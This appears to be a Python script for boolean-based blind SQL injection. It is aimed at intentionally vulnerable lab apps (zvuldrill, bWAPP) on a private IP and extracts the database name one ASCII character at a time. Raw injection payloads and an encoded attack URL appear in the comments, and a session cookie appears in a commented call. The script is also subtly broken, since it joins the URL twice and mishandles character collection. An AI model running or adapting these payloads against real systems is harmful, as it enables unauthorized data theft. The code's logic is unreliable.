#-*-coding:utf-8-*-

#这两个注入语句都是正确的！不过最好还是把select带上
#SELECT * FROM test1 WHERE id=0 or if((ascii(substr((select database()),1,1))<120),1,0)
#SELECT * FROM test1 WHERE id=0 or if((select ascii(substr((select database()),1,1))<120),1,0)

# 查询数据库名字
# select * from movies where id='1' or if((select ascii(substr((select database()),1,1))=98),1,0);
# http://192.168.52.128/test2/zvuldrill-master/search.php?search=1%'or if((select ascii(substr((select database()),1,1))=122),1,0)%23

import urllib
from urllib import request


def get_dbname(url='http://192.168.52.128/test2/zvuldrill-master/search.php?search=1',cookie=False,type='search',dblength=9):

    dbname = ''

    response_length = 0

    if type == 'int':
        payload = '+or+if((select+ascii(substr((select+database()),{dbname_str_localtion},1))={ascii_number}),1,0)'
    elif type == 'string':
        payload = '\'+or+if((select+ascii(substr((select+database()),{dbname_str_localtion},1))={ascii_number}),1,0)%23'
    elif type == 'search':
        payload = '%\'+or+if((select+ascii(substr((select+database()),{dbname_str_localtion},1))={ascii_number}),1,0)%23'

    #payload='%\'+or+if((select+ascii(substr((select+database()),{localtion},1))={ascii_number}),1,0)%23'

    payloads = ["97", "98", "99","100", "101", "102", "103", "104", "105", "106", "107","108", "109", "110", "111", "112", "113", "114", "115", "116", "117", "118", "119", "120", "121", "122",
                "95",
                "48", "49", "50", "51", "52", "53", "54", "55", "56", "57",]

    for i in range(1,dblength+1):

        for j in payloads:

            full_payload=url+payload.format(dbname_str_localtion=str(i),ascii_number=str(j))

            #print(full_payload)

            url_response = urllib.request.Request(url + full_payload)

            if (cookie != False):
                url_response.add_header('Cookie', cookie)

            url_read = request.urlopen(url_response).read()

            url_read_length=len(url_read)

            if response_length<url_read_length:

                response_length=url_read_length

                dbname=chr(int(j))

            elif response_length==url_read_length:
                dbname += chr(int(j))

            print(dbname)

    print(dbname)

if __name__ == "__main__":

    url1 = 'http://192.168.52.128/test2/zvuldrill-master/search.php?search=1'

    url2 = 'http://192.168.52.128/bWAPP/bWAPP/sqli_2.php?action=go&movie=100'

    get_dbname()
    #get_dbname(url2, cookie='security_level=0;PHPSESSID=r2rn1sttfeldh3iutamthqduu3', type='int',dblength=5)